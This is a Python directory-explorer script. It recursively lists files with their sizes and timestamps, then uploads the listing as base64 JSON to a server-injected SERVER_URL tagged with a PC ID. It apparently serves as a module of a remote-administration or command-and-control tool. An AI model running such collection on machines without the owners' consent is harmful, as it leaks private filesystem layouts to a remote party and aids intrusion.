# -*- coding: utf-8 -*-
"""
File Explorer - Browse any directory with tree view
Supports browsing any path on the system
"""
import os
import sys
import json
import base64
import urllib.request
from datetime import datetime
from pathlib import Path

# Fix stdout encoding for Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except:
        pass

# SERVER_URL will be injected by the server when sending the script
try:
    SERVER_URL
except NameError:
    print("ERROR: SERVER_URL not set. Server should inject this variable.")
    sys.exit(1)
PC_ID = os.environ.get("CC_PC_ID", "unknown")

# Import standardized path utilities
try:
    from path_utils import get_base_path
except ImportError:
    import os
    import sys
    def get_base_path():
        if getattr(sys, 'frozen', False):
            return os.path.dirname(sys.executable)
        script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
        if os.path.basename(script_dir) == 'Scripts':
            return os.path.dirname(script_dir)
        return script_dir

# Get target path from environment or use executable directory (not user home)
TARGET_PATH = os.environ.get("EXPLORER_PATH", get_base_path())
MAX_DEPTH = int(os.environ.get("EXPLORER_DEPTH", "3"))  # Default depth 3
SHOW_HIDDEN = os.environ.get("EXPLORER_SHOW_HIDDEN", "false").lower() == "true"


def safe_str(s):
    """Convert string to ASCII-safe version"""
    if s is None:
        return ""
    try:
        if isinstance(s, bytes):
            s = s.decode('utf-8', errors='replace')
        return s.encode('ascii', 'replace').decode('ascii')
    except:
        return "???"


def format_size(size):
    """Format file size"""
    try:
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.1f} KB"
        elif size < 1024 * 1024 * 1024:
            return f"{size / (1024 * 1024):.1f} MB"
        else:
            return f"{size / (1024 * 1024 * 1024):.2f} GB"
    except:
        return "? B"


def get_file_info(path):
    """Get detailed file information"""
    try:
        stat = os.stat(path)
        return {
            'size': stat.st_size,
            'size_str': format_size(stat.st_size),
            'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
            'accessed': datetime.fromtimestamp(stat.st_atime).isoformat(),
            'is_dir': os.path.isdir(path),
            'is_file': os.path.isfile(path),
            'extension': os.path.splitext(path)[1].lower() if os.path.isfile(path) else '',
        }
    except Exception as e:
        return {'error': str(e)}


def explore_directory(path, depth=0, max_items=1000):
    """Explore directory and return structure"""
    result = {
        'path': path,
        'name': os.path.basename(path) or path,
        'type': 'directory',
        'items': [],
        'total_files': 0,
        'total_dirs': 0,
        'total_size': 0,
        'error': None
    }
    
    if depth >= MAX_DEPTH:
        result['truncated'] = True
        return result
    
    try:
        if not os.path.exists(path):
            result['error'] = 'Path does not exist'
            return result
        
        if not os.path.isdir(path):
            result['error'] = 'Path is not a directory'
            return result
        
        items = []
        item_count = 0
        
        for item in os.listdir(path):
            if item_count >= max_items:
                result['truncated'] = True
                break
            
            item_path = os.path.join(path, item)
            
            # Skip hidden files if not requested
            if not SHOW_HIDDEN and item.startswith('.'):
                continue
            
            try:
                item_info = get_file_info(item_path)
                item_info['name'] = item
                item_info['path'] = item_path
                
                if item_info.get('is_dir'):
                    result['total_dirs'] += 1
                    # Recursively explore subdirectory if depth allows
                    if depth + 1 < MAX_DEPTH:
                        subdir = explore_directory(item_path, depth + 1, max_items // 2)
                        item_info['subdir'] = subdir
                else:
                    result['total_files'] += 1
                    result['total_size'] += item_info.get('size', 0)
                
                items.append(item_info)
                item_count += 1
            except Exception as e:
                items.append({
                    'name': item,
                    'path': item_path,
                    'error': str(e)
                })
        
        result['items'] = sorted(items, key=lambda x: (
            x.get('is_dir', False) and not x.get('is_file', False),  # Directories first
            x.get('name', '').lower()
        ))
        
    except PermissionError:
        result['error'] = 'Permission denied'
    except Exception as e:
        result['error'] = str(e)
    
    return result


def main():
    print("=" * 70)
    print("   FILE EXPLORER")
    print("=" * 70)
    print(f"   Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"   Target Path: {safe_str(TARGET_PATH)}")
    print(f"   Max Depth: {MAX_DEPTH}")
    print(f"   Show Hidden: {SHOW_HIDDEN}")
    print("=" * 70)
    
    # Explore the directory
    print(f"\n[*] Exploring directory...")
    result = explore_directory(TARGET_PATH)
    
    if result.get('error'):
        print(f"[!] Error: {result['error']}")
        return
    
    print(f"[OK] Found {result['total_dirs']} directories, {result['total_files']} files")
    print(f"     Total size: {format_size(result['total_size'])}")
    
    # Print tree structure
    def print_tree(node, prefix="", is_last=True):
        """Print directory tree"""
        connector = "└── " if is_last else "├── "
        print(f"{prefix}{connector}{safe_str(node['name'])}")
        
        if node.get('is_dir') and node.get('subdir'):
            extension = "    " if is_last else "│   "
            items = node['subdir'].get('items', [])[:10]  # Limit sub-items
            for i, item in enumerate(items):
                is_item_last = i == len(items) - 1
                print_tree(item, prefix + extension, is_item_last)
    
    print("\n[*] Directory Structure:")
    print(safe_str(result['name']))
    for i, item in enumerate(result['items'][:50]):  # Show first 50 items
        is_last = i == min(49, len(result['items']) - 1)
        print_tree(item, "", is_last)
    
    if len(result['items']) > 50:
        print(f"\n    ... and {len(result['items']) - 50} more items")
    
    # Upload JSON result
    try:
        json_data = {
            'scan_time': datetime.now().isoformat(),
            'target_path': TARGET_PATH,
            'result': result
        }
        
        json_str = json.dumps(json_data, indent=2, ensure_ascii=True)
        json_bytes = json_str.encode('utf-8')
        json_base64 = base64.b64encode(json_bytes).decode('utf-8')
        
        upload_data = {
            "pc_id": PC_ID,
            "filename": f"file_explorer_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "content_base64": json_base64,
            "original_path": TARGET_PATH
        }
        
        data = json.dumps(upload_data).encode('utf-8')
        req = urllib.request.Request(
            f"{SERVER_URL}/upload/base64",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=60) as response:
            upload_result = json.loads(response.read().decode('utf-8'))
            print(f"\n[*] Result uploaded to server (ID: {upload_result.get('file_id', 'unknown')})")
    except Exception as e:
        print(f"[!] Upload error: {safe_str(str(e))}")
    
    print("\n" + "=" * 70)
    print("[OK] File explorer complete!")
    print("=" * 70)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"[FATAL ERROR] {safe_str(str(e))}")

